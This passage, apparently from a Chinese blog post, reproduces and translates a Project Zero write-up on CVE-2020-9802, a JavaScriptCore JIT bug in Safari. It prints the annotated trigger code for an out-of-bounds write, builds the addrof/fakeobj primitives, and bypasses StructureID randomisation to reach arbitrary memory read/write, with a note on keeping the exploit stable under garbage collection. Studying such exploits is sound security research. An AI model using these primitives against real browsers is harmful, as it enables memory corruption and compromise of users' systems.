mem[0],zero</span><br>   Target <span class="hljs-number">0</span>: (jsc) stopped.<br>   (lldb) reg read <span class="hljs-built_in">rcx</span><br>        <span class="hljs-built_in">rcx</span> = <span class="hljs-number">0x0000000080000000</span><br></code></pre></td></tr></table></figure><p>然而，不方便的是，越界索引（在rcx中）将始终是INT_MIN，因此访问数组后面的 <code>0x80000000 * 8 = 16GB</code>。虽然可能可以利用，但它并不是最好的利用原语。</p><p>实现任意索引的OOB访问（具有任意索引的越界访问）的最后一个技巧是从i中减去一个常数，这将使INT_MIN变成任意正数。由于DFG编译器认为i始终为正数，因此减法将不受检查，因此溢出将不会被注意到。</p><p>但是，由于减法会使有关下限的整数范围信息无效，因此之后需要进行额外的<code>if i &gt; 0</code>检查，以再次触发边界检查消除。此外，由于减法会将训练期间使用的整数变成越界索引，因此只有在输入值为负数时才会有条件地执行。幸运的是，DFG编译器还不够聪明，无法确定该条件永远不应为真，在这种情况下它可以完全优化减法。</p><p>综上所述，下面再次展示了从开始时的函数，但这次带有注释。当被JIT编译并被赋予<code>INT_MIN</code>作为<code>n</code>时，它会导致一个受控值（<code>0x0000133700001337</code>）的越界写入，直接写入内存中紧随<code>arr</code>之后的JSArray的长度字段。请注意，这一步的成功取决于正确的堆布局。然而，由于这个漏洞足够强大，可以用于受控的越界读取，因此可以在触发内存损坏之前确保正确的堆布局存在。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hax</span>(<span class="hljs-params">arr, n</span>) &#123;<br>    <span class="hljs-comment">// Force n to be a 32bit integer.</span><br>    n |= <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">// Let IntegerRangeOptimization know that </span><br>    <span class="hljs-comment">// n will be a negative number inside the body.</span><br>    <span class="hljs-keyword">if</span> (n &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">// Force &quot;non-number bytecode usage&quot; so the negation </span><br>        <span class="hljs-comment">// becomes unchecked and as such INT_MIN will again</span><br>        <span class="hljs-comment">// become INT_MIN in the last iteration.</span><br>        <span class="hljs-keyword">let</span> v = (-n)|<span class="hljs-number">0</span>;<br><br>        <span class="hljs-comment">// As n is known to be negative here, this ArithAbs </span><br>        <span class="hljs-comment">// will become a ArithNegate. That negation will be </span><br>        <span class="hljs-comment">// checked, but then be CSE&#x27;d for the previous, </span><br>        <span class="hljs-comment">// unchecked one. This is the compiler bug.</span><br>        <span class="hljs-keyword">let</span> i = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">abs</span>(n);<br><br>        <span class="hljs-comment">// However, IntegerRangeOptimization has also marked </span><br>        <span class="hljs-comment">// i as being &gt;= 0...</span><br><br>        <span class="hljs-keyword">if</span> (i &lt; arr.<span class="hljs-property">length</span>) &#123;<br>            <span class="hljs-comment">// .. so here IntegerRangeOptimization now believes </span><br>            <span class="hljs-comment">// i will be in the range [0, arr.length) while i </span><br>            <span class="hljs-comment">// will actually be INT_MIN in the final iteration.</span><br><br>            <span class="hljs-comment">// This condition is written this way so integer </span><br>            <span class="hljs-comment">// range optimization isn&#x27;t able to propagate range </span><br>            <span class="hljs-comment">// information (in particular that i must be a </span><br>            <span class="hljs-comment">// negative integer) into the body.</span><br>            <span class="hljs-keyword">if</span> (i &amp; <span class="hljs-number">0x80000000</span>) &#123;<br>                <span class="hljs-comment">// In the last iteration, this will turn INT_MIN </span><br>                <span class="hljs-comment">// into an arbitrary, positive number since the</span><br>                <span class="hljs-comment">// ArithAdd has been made unchecked by integer range</span><br>                <span class="hljs-comment">// optimization (as it believes i to be a positive</span><br>                <span class="hljs-comment">// number) and so doesn&#x27;t bail out when overflowing</span><br>                <span class="hljs-comment">// int32.</span><br>                i += -<span class="hljs-number">0x7ffffff9</span>;<br>            &#125;<br><br>            <span class="hljs-comment">// This conditional branch is now necessary due to </span><br>            <span class="hljs-comment">// the subtraction above. Otherwise, </span><br>            <span class="hljs-comment">// IntegerRangeOptimization couldn’t prove that i </span><br>            <span class="hljs-comment">// was always positive.</span><br>            <span class="hljs-keyword">if</span> (i &gt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-comment">// In here, IntegerRangeOptimization again believes</span><br>                <span class="hljs-comment">// i to be in the range [0, arr.length) and thus</span><br>                <span class="hljs-comment">// eliminates the CheckBounds node, leading to a </span><br>                <span class="hljs-comment">// controlled OOB access. This write will then corrupt</span><br>                <span class="hljs-comment">// the header of the following JSArray, setting its</span><br>                <span class="hljs-comment">// length and capacity to 0x1337.</span><br>                arr[i] = <span class="hljs-number">1.04380972981885e-310</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Addrof-Fakeobj"><a href="#Addrof-Fakeobj" class="headerlink" title="Addrof&#x2F;Fakeobj"></a>Addrof&#x2F;Fakeobj</h3><blockquote><p><code>Addrof</code>和<code>fakeobj</code>是JS引擎漏洞利用中常见的两种原语，通常用于实现<strong>地址泄露和伪造对象</strong>。</p><p><code>addrof</code> 是一种用于泄露 JavaScript 对象内存地址的原语。</p><p><strong>原理</strong></p><ul><li>JavaScript 引擎通常会将对象的地址存储在内存中，但这些地址对 JavaScript 代码是不可见的。</li><li>通过某些漏洞（如类型混淆、越界访问等），攻击者可以绕过引擎的保护机制，读取对象的内存地址。</li></ul><p><code>fakeobj</code> 是一种用于伪造 JavaScript 对象的原语。</p><p><strong>原理</strong></p><ul><li>JavaScript 引擎通过内存中的数据结构来表示对象（如隐藏类、属性存储区等）。</li><li>通过某些漏洞，攻击者可以构造一个伪造的对象，并将其传递给引擎，使引擎将其视为合法的对象。</li></ul></blockquote><p>至此，可以构建两个低级别的漏洞利用原语<code>addrof</code>和<code>fakeobj</code>。原语<code>addrof(obj)</code>返回给定JavaScript对象在内存中的地址（作为双精度浮点数）：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> obj = &#123;<span class="hljs-attr">a</span>: <span class="hljs-number">42</span>&#125;;<br><span class="hljs-keyword">let</span> addr = <span class="hljs-title function_">addrof</span>(obj);<br><span class="hljs-comment">// 2.211548541e-314 (0x000000010acdc250 as 64bit integer)</span><br></code></pre></td></tr></table></figure><p>fakeobj(addr)原语返回一个包含给定地址作为有效负载的JSValue：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> obj2 = <span class="hljs-title function_">fakeobj</span>(addr);<br>obj2 === obj;<br><span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><p>这些原语非常有用，因为它们基本上可以实现两件事：打破堆 ASLR，以便将受控数据放置在已知地址，并提供一种构造和“注入”假对象到引擎的方法。但有关利用的更多内容请参见第 II 节。</p><img src="/2025/03/12/CVE-2020-9802-JSC%E7%BC%96%E8%AF%91%E4%BC%98%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20250309222704570.png" class="" title="image-20250309222704570"><p>这两个原语可以用两个具有不同存储类型的JSArray来构造：通过重叠一个存储（unboxed&#x2F;raw）双精度浮点数的JSArray与一个存储JSValue的JSArray（boxed&#x2F;tagged的值，例如可以是JSObject的指针）</p><blockquote><p>unboxed&#x2F;raw ： 这种数组直接将双精度浮点数存储在数组的连续内存空间中，没有额外的元数据或标记。这种存储效率很高，但只能存储双精度浮点数。</p><p>JSValues（boxed&#x2F;tagged）：boxing指将原始类型（例如数字、布尔值）包装成对象。tagging指的是在JSValue中使用一些位来表示值的类型。例如，可以使用一个位来区分整数和指针。</p></blockquote><p>然后允许通过<code>float_arr</code>以双精度形式读取&#x2F;写入obj_arr中的指针值：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> noCoW = <span class="hljs-number">13.37</span>;<br><span class="hljs-keyword">let</span> target = [noCoW, <span class="hljs-number">1.1</span>, <span class="hljs-number">2.2</span>, <span class="hljs-number">3.3</span>, <span class="hljs-number">4.4</span>, <span class="hljs-number">5.5</span>, <span class="hljs-number">6.6</span>];<br><span class="hljs-keyword">let</span> float_arr = [noCoW, <span class="hljs-number">1.1</span>, <span class="hljs-number">2.2</span>, <span class="hljs-number">3.3</span>, <span class="hljs-number">4.4</span>, <span class="hljs-number">5.5</span>, <span class="hljs-number">6.6</span>];<br><span class="hljs-keyword">let</span> obj_arr = [&#123;&#125;, &#123;&#125;, &#123;&#125;, &#123;&#125;, &#123;&#125;, &#123;&#125;, &#123;&#125;];<br><br><span class="hljs-comment">// Trigger the bug to write past the end of the target array and</span><br><span class="hljs-comment">// thus corrupting the length of the float_arr following it</span><br><span class="hljs-title function_">hax</span>(target, n);<br><br><span class="hljs-title function_">assert</span>(float_arr.<span class="hljs-property">length</span> == <span class="hljs-number">0x1337</span>);<br><br><span class="hljs-comment">// (OOB) index into float_arr that overlaps with the first element    </span><br><span class="hljs-comment">// of obj_arr.</span><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">OVERLAP_IDX</span> = <span class="hljs-number">8</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">addrof</span>(<span class="hljs-params">obj</span>) &#123;<br>    obj_arr[<span class="hljs-number">0</span>] = obj;<br>    <span class="hljs-keyword">return</span> float_arr[<span class="hljs-variable constant_">OVERLAP_IDX</span>];<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">fakeobj</span>(<span class="hljs-params">addr</span>) &#123;<br>    float_arr[<span class="hljs-variable constant_">OVERLAP_IDX</span>] = addr;<br>    <span class="hljs-keyword">return</span> obj_arr[<span class="hljs-number">0</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p>请注意<code>noCoW</code>变量的使用有些不直观。它用于阻止JSC将数组分配为写时复制（copy-on-write）数组，否则会导致错误的堆布局。</p><blockquote><p>copy-on-write（CoW）：是一种优化技术，用于延迟复制资源（例如内存页），直到其中一个 副本被修改时才真正进行复制。在多个进程或对象共享同一资源时，CoW可以节省内存和提高性能。</p></blockquote><h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>我希望这已经是一个有趣的“非标准”JIT编译器漏洞演练。请记住，有许多（JIT）漏洞更容易被利用。另一方面，利用（到目前为止）并不简单，这也允许在此过程中触及许多JSC和JIT编译器内部。</p><blockquote><p>翻译自（+了些个人理解）：<a href="https://googleprojectzero.blogspot.com/2020/09/jitsploitation-one.html">JITSpoitation I</a></p></blockquote><h2 id="JITSpoitation-II-Getting-Read-Write"><a href="#JITSpoitation-II-Getting-Read-Write" class="headerlink" title="JITSpoitation II : Getting Read&#x2F;Write"></a>JITSpoitation II : Getting Read&#x2F;Write</h2><p>这是关于Safari渲染器中由JIT漏洞引发的漏洞利用系列的第二部分。在第一部分中，讨论了DFG JIT在公共子表达式消除实现中的一个漏洞。第二部分从众所周知的<code>addrof</code>和<code>fakeobj</code>原语开始，展示了如何从中构建稳定、任意的内存读&#x2F;写。此，将讨论并绕过 StructureID 随机化缓解措施和 Gigacage。</p><h3 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h3><p>早在2016年，攻击者会使用 <code>addrof</code> 和 <code>fakeobj</code> 原语来伪造一个 ArrayBuffer，从而立即获得可靠的任意内存读&#x2F;写原语。 但在 2018 年年中，WebKit 引入了“Gigacage”，试图阻止以这种方式滥用 ArrayBuffer。 Gigacage 的工作原理是将 ArrayBuffer 的后备存储移动到一个 4GB 的堆区域中，并使用 32 位相对偏移量而不是绝对指针来引用它们，从而（或多或少）使得使用 ArrayBuffer 访问 cage 之外的数据成为不可能。</p><p>然而，虽然 ArrayBuffer 的存储被 caged （关住）了，但包含数组元素的 JSArray Butterflies 却没有。 由于它们可以存储原始的浮点数值，攻击者可以通过伪造这样一个“未装箱的双精度” JSArray，立即获得相当强大的任意读&#x2F;写能力。 过去，各种公开的漏洞利用程序就是通过这种方式绕过 Gigacage 的。 （不幸的是）WebKit 引入了一种旨在阻止攻击者完全伪造 JavaScript 对象的缓解措施：StructureID 随机化。 因此，必须首先绕过这种缓解措施。</p><blockquote><p>使用<code>addrof</code>原语获得一个合法的<code>ArrayBuffer</code>的地址。使用<code>fakeobj</code>原语修改一个对象的内存布局，使其对象头与<code>ArrayBuffer</code>的对象头一致。通过漏洞修改伪造的<code>ArrayBuffer</code>的backing store指针，使其指向任意内存地址。</p><p>在这里，以本人的基础，后续的缓解机制都难以理解。我认为应该先复现第一批漏洞，也就是WebKit引入第一个缓解机制前（2016年-2018年的JSC漏洞），这样能够清晰这里面的漏洞产生原理，漏洞挖掘机制。后续的补丁，以及缓解机制都是一层一层增加的。那么，这种情况下，也应该一层一层进行剥离。否则难以真正理解这些缓解机制为何这么绕过，难以真正理解漏洞成因。因此就不去翻译第三篇博客了。当后续复现完前面的漏洞后，再来此进行填补。——2025.3.12</p></blockquote><p>因此，这篇文章将：</p><ul><li>解释 JSObject 的内存布局</li><li>绕过 StructureID 随机化来伪造 JSArray 对象</li><li>使用伪造的 JSArray 对象来设置一个（有限的）内存读&#x2F;写原语</li><li>突破 Gigacage 以获得快速、可靠且真正任意的读&#x2F;写原语</li></ul><h3 id="伪造对象"><a href="#伪造对象" class="headerlink" title="伪造对象"></a>伪造对象</h3><p>为了伪造对象，必须了解它们的内存布局。在JSC中，一个普通的JSObject由一个<code>JSCell</code>头部、紧随其后的“Butterfly”以及可能存在的内联属性组成。 Butterfly 是一个存储缓冲区，包含对象的属性和元素以及元素的数量（长度）：</p><img src="/2025/03/12/CVE-2020-9802-JSC%E7%BC%96%E8%AF%91%E4%BC%98%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20250310155850597.png" class="" title="image-20250310155850597"><p>像 JSArrayBuffer 这样的对象会在 JSObject 布局中添加更多成员。</p><p>每个 JSCell 头部通过 <code>StructureID</code> 字段引用一个 <code>Structure</code>，<code>StructureID</code> 是运行时环境的 <code>StructureIDTable</code> 中的一个索引。 <code>Structure</code> 本质上是一个类型信息的 blob，包含诸如此类的信息：</p><ul><li>对象的基类型，例如 JSObject、JSArray、JSString、JSUint8Array，…</li><li>对象的属性以及它们相对于对象的存储位置</li><li>对象的大小（以字节为单位）</li><li>索引类型，指示存储在 Butterfly 中的数组元素的类型，例如 JSValue、Int32 或未装箱的双精度浮点数，以及它们是存储为连续的数组还是以其他方式存储，例如在映射中。</li><li>等等。</li></ul><p>最后，剩余的 JSCell 头部位包含诸如 GC 标记状态之类的内容，并“缓存”一些常用的类型信息位，例如索引类型。 下图总结了 64 位架构上普通 JSObject 的内存布局。</p><img src="/2025/03/12/CVE-2020-9802-JSC编译优化漏洞复现/image-20250310160146108.png"  alt="image-20250310160146108" style="zoom: 50%;" /><p>对对象执行的大多数操作都需要查看对象的 Structure，以确定如何处理该对象。 因此，在创建伪造的 JSObject 时，必须知道要伪造的对象类型的 StructureID。 以前，可以使用 StructureID 喷射 (Spraying) 来预测 StructureID。 这种方法通过简单地分配许多所需类型的对象（例如，Uint8Array）并向每个对象添加不同的属性来实现，从而导致为该对象分配唯一的 Structure，进而分配唯一的 StructureID。 这样做一千次也许几乎可以保证 1000 是 Uint8Array 对象的有效 StructureID。 这就是 StructureID 随机化（2019 年初推出的一种新的漏洞利用缓解措施）发挥作用的地方。</p><h3 id="StructureID-随机化"><a href="#StructureID-随机化" class="headerlink" title="StructureID 随机化"></a>StructureID 随机化</h3><p>这种漏洞利用缓解措施背后的想法非常简单：由于攻击者（据推测）需要知道有效的 StructureID 才能伪造对象，因此随机化 ID 将会阻碍这一点。 确切的随机化方案已在源代码中得到充分记录。 这样，现在就不可能预测 StructureID 了。</p><p>绕过 StructureID 随机化有不同的方法，包括：</p><ul><li>泄漏有效的 StructureID，例如通过 OOB 读取</li><li>滥用不检查 StructureID 的代码，如已证明的那样</li><li>构建“StructureID oracle”来暴力破解有效的 StructureID</li></ul><p>“StructureID oracle”的一个可能的想法是再次滥用 JIT。 编译器发出的一种非常常见的代码模式是 StructureCheck，用于保护类型推测。 在伪 C 代码中，它们大致如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> structID = LoadStructureId(obj)<br><span class="hljs-keyword">if</span> (structID != EXPECTED_STRUCT_ID) &#123;<br>    bailout();<br>&#125;<br></code></pre></td></tr></table></figure><p>这可能允许构建一个“StructureID oracle”：如果可以构造一个 JIT 编译的函数，该函数检查 StructureID，但不使用该 StructureID，那么攻击者应该能够通过观察是否发生了 bailout 来确定 StructureID 是否有效。 反过来，可以通过计时，或者通过“利用” JIT 中的正确性问题来实现这一点，该问题导致相同的代码在 JIT 中运行与在解释器中运行产生不同的结果（在 bailout 后执行将继续）。 像这样的 oracle 将允许攻击者通过预测递增的索引位并暴力破解 7 个熵位来暴力破解有效的结构 ID。</p><p>然而，泄漏有效的 StructureID 和滥用不检查 StructureID 的代码似乎是更容易的选择。 特别是，在解释器中加载 JSArray 元素时，有一条代码路径永远不会访问 StructureID：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> ALWAYS_INLINE JSValue <span class="hljs-title function_">getByVal</span><span class="hljs-params">(VM&amp; vm, JSValue baseValue, JSValue subscript)</span><br>&#123;<br>    ...;<br>    <span class="hljs-keyword">if</span> (subscript.isUInt32()) &#123;<br>        <span class="hljs-type">uint32_t</span> i = subscript.asUInt32();<br>        <span class="hljs-keyword">if</span> (baseValue.isObject()) &#123;<br>            JSObject* object = asObject(baseValue);<br>            <span class="hljs-keyword">if</span> (object-&gt;canGetIndexQuickly(i))<br>                <span class="hljs-keyword">return</span> object-&gt;getIndexQuickly(i);<br></code></pre></td></tr></table></figure><p>在这里，<code>getIndexQuickly</code> 直接从 Butterfly 加载元素，而 <code>canGetIndexQuickly</code> 只查看 JSCell 头部中的索引类型（其值为已知的常量）和 Butterfly 中的长度：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">bool</span> <span class="hljs-title function_">canGetIndexQuickly</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> i)</span> <span class="hljs-type">const</span> &#123;<br>    <span class="hljs-type">const</span> Butterfly* butterfly = this-&gt;butterfly();<br>    <span class="hljs-keyword">switch</span> (indexingType()) &#123;<br>    ...;<br>    <span class="hljs-keyword">case</span> ALL_CONTIGUOUS_INDEXING_TYPES:<br>        <span class="hljs-keyword">return</span> i &lt; butterfly-&gt;vectorLength() &amp;&amp; butterfly-&gt;contiguous().at(this, i);<br>&#125;<br></code></pre></td></tr></table></figure><p>现在，这允许伪造一个看起来有点像 JSArray 的东西，将其后备存储指针指向另一个有效的 JSArray，然后读取该 JSArray 的 JSCell 头部，其中包含有效的 StructureID：</p><img src="/2025/03/12/CVE-2020-9802-JSC编译优化漏洞复现/image-20250310164441325.png"  alt="image-20250310164441325" style="zoom:80%;" /><p>至此，StructureID 随机化已被完全绕过。</p><p>以下 JavaScript 代码实现了这一点，像往常一样通过（滥）用“容器”对象的内联属性来伪造对象：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> container = &#123;<br>    <span class="hljs-attr">jscell_header</span>: jscell_header,<br>    <span class="hljs-attr">butterfly</span>: legit_float_arr,<br>&#125;;<br><br><span class="hljs-keyword">let</span> container_addr = <span class="hljs-title function_">addrof</span>(container);<br><span class="hljs-comment">// add offset from container object to its inline properties</span><br><span class="hljs-keyword">let</span> fake_array_addr = <span class="hljs-title class_">Add</span>(container_addr, <span class="hljs-number">16</span>);  <br><span class="hljs-keyword">let</span> fake_arr = <span class="hljs-title function_">fakeobj</span>(fake_array_addr);<br><br><span class="hljs-comment">// Can now simply read a legitimate JSCell header and use it.</span><br>jscell_header = fake_arr[<span class="hljs-number">0</span>];<br>container.<span class="hljs-property">jscell_header</span> = jscell_header;<br><br><span class="hljs-comment">// Can read/write to memory now by corrupting the butterfly</span><br><span class="hljs-comment">// pointer of the float array.</span><br>fake_arr[<span class="hljs-number">1</span>] = <span class="hljs-number">3.54484805889626e-310</span>;    <span class="hljs-comment">// 0x414141414141 in hex</span><br>float_arr[<span class="hljs-number">0</span>] = <span class="hljs-number">1337</span>;<br></code></pre></td></tr></table></figure><p>此代码在访问 0x414141414141 附近的内存时会崩溃。 因此，攻击者现在获得了任意内存读取&#x2F;写入原语，尽管是稍微有限制的一种：</p><ul><li>只能读取和写入有效的双精度浮点数值</li><li>由于 Butterfly 也存储了自己的长度，因此有必要定位 Butterfly 指针，使其长度看起来足够大，以访问所需的数据</li></ul><h3 id="关于漏洞利用稳定性的说明"><a href="#关于漏洞利用稳定性的说明" class="headerlink" title="关于漏洞利用稳定性的说明"></a>关于漏洞利用稳定性的说明</h3><p>运行当前的漏洞利用程序会产生内存读取&#x2F;写入，但很可能在垃圾收集器下次运行时扫描所有可访问的堆对象后不久崩溃。</p><p>实现漏洞利用稳定性的通用方法是使所有堆对象保持在正常运行状态（当 GC 扫描对象并访问所有传出指针时不会导致崩溃的状态），或者，如果这不可能，则在损坏后尽快修复它们。 在此漏洞利用的情况下，<code>fake_arr</code> 最初是“GC 不安全的”，因为它包含无效的 StructureID。 当其 JSCell 稍后被替换为有效的 JSCell（<code>container.jscell_header = jscell_header;</code>）时，伪造的对象变得“GC 安全”，因为它对 GC 来说看起来像一个有效的 JSArray。</p><p>但是，某些边缘情况也可能导致损坏的数据存储在引擎的其他地方。 例如，先前 JavaScript 代码段中的数组加载（<code>jscell_header = fake_arr[0];</code>）将由 <code>get_by_val</code> 字节码操作执行。 此操作还会保留上次看到的结构 ID 的缓存，该缓存用于构建 JIT 编译器依赖的值配置文件。 这是有问题的，因为伪造的 JSArray 的结构 ID 无效，因此会导致崩溃，例如当 GC 扫描字节码缓存时。 然而，幸运的是，修复起来相当容易：执行相同的 <code>get_by_val</code> 操作两次，第二次使用有效的 JSArray，其 StructureID 将随后被缓存：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// ...</span><br><span class="hljs-keyword">let</span> fake_arr = <span class="hljs-title function_">fakeobj</span>(fake_array_addr);<br><span class="hljs-keyword">let</span> legit_arr = float_arr;<br><span class="hljs-keyword">let</span> results = [];<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">2</span>; i++) &#123;<br>    <span class="hljs-keyword">let</span> a = i == <span class="hljs-number">0</span> ? fake_arr : legit_arr;<br>    results.<span class="hljs-title function_">push</span>(a[<span class="hljs-number">0</span>]);<br>&#125;<br>jscell_header = results[<span class="hljs-number">0</span>];<br><span class="hljs-comment">// ...</span><br></code></pre></td></tr></table></figure><p>这样做可以使当前的漏洞利用程序在 GC 执行期间保持稳定。</p><h3 id="突破-Giga-Cage"><a href="#突破-Giga-Cage" class="headerlink" title="突破 (Giga-)Cage"></a>突破 (Giga-)Cage</h3><p>注意：这部分主要是一个有趣的 JIT 漏洞利用练习，对于已经构建了足够强大的读&#x2F;写原语的漏洞利用来说，并不是严格必需的。 然而，它可以使漏洞利用程序更快，因为从中获得的读&#x2F;写性能更高，而且是真正任意的。</p><p>与本文开头描述的有些相反，JSC 中的 ArrayBuffer 实际上受到两种不同机制的保护：</p><ul><li>Gigacage：一个多 GB 的虚拟内存区域，其中分配了 TypedArray（以及一些其他对象）的后备存储缓冲区。 后备存储指针现在基本上是从 cage 基址开始的 32 位偏移量，而不是 64 位指针，从而防止访问 cage 之外的内容。</li><li>PACCage：除了 Gigacage 之外，TypedArray 后备存储指针现在还通过指针身份验证代码 (PAC) 进行保护（如果可用），防止在堆上篡改它们，因为攻击者通常无法伪造有效的 PAC 签名。</li></ul><p>用于组合 Gigacage 和 PACCage 的确切方案记录在例如 commit 205711404e 中。 这样，TypedArray 本质上受到了双重保护，因此评估是否仍然可以滥用它们进行读&#x2F;写似乎是一项有价值的尝试。 寻找潜在问题的一个地方再次是 JIT，因为它具有用于提高性能的 TypedArray 的特殊处理。</p><h4 id="DFG中的TypedArrays"><a href="#DFG中的TypedArrays" class="headerlink" title="DFG中的TypedArrays"></a>DFG中的TypedArrays</h4><p>考虑以下JavaScript代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">opt</span>(<span class="hljs-params">a</span>) &#123;<br>    <span class="hljs-keyword">return</span> a[<span class="hljs-number">0</span>];<br>&#125;<br><br><span class="hljs-keyword">let</span> a = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>(<span class="hljs-number">1024</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100000</span>; i++) <span class="hljs-title function_">opt</span>(a);<br></code></pre></td></tr></table></figure><p>在DFG中进行优化时，opt函数将大致转换为以下DFG IR（省略了许多细节）：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">CheckInBounds a, <span class="hljs-number">0</span><br><span class="hljs-built_in">v0</span> = GetIndexedPropertyStorage<br><span class="hljs-built_in">v1</span> = GetByVal <span class="hljs-built_in">v0</span>, <span class="hljs-number">0</span><br>Return <span class="hljs-built_in">v1</span><br></code></pre></td></tr></table></figure><p>有趣的是，对 TypedArray 的访问已被拆分为三个不同的操作：对索引的边界检查、一个 <code>GetIndexedPropertyStorage</code> 操作（负责获取和取消 caged 的后备存储指针）以及一个 <code>GetByVal</code> 操作（它本质上会转换为单个内存加载指令）。 假设 r0 包含指向 TypedArray <code>a</code> 的指针，则上述 IR（中间表示）将导致大致如下的机器代码：</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs smali">; bounds<span class="hljs-built_in"> check </span>omitted<br><span class="hljs-class">Lda r2, [r0 + 24];</span><br>; Uncage<span class="hljs-built_in"> and </span>unPAC r2 here<br>Lda r0, [r2]<br>B lr<br></code></pre></td></tr></table></figure><p>然而，如果没有可用的通用寄存器供 <code>GetIndexedPropertyStorage</code> 存储原始指针，会发生什么情况？ 